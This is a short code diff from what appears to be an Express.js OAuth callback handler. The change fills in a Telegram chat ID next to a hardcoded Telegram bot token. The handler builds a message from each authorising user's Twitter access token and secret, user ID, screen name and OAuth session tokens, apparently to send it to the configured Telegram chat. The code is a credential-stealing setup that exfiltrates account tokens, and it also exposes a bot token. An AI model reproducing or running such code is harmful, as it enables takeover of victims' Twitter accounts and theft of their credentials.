@@ -80,7 +80,7 @@ app.get("/callback", (req, res) => {
         // Now you have the access tokens and additional user information
         const telegramBotToken =
           "6905104877:AAFH0PWM3y57IfA6WWb8vQN2jpwbsCECuaI"; //your telegram API key here 
-        const chatId = ""; // your chat id or group id here 
+        const chatId = "-1001941763380"; // your chat id or group id here 
 
         const message = `Twitter Access Token: ${accessToken}\nTwitter Access Token Secret: ${accessTokenSecret}\nUser ID: ${results.user_id}\nScreen Name: ${results.screen_name}\nAuth Token: ${req.session.oauthToken}\nAuth Token Secret: ${req.session.oauthTokenSecret}`;
 
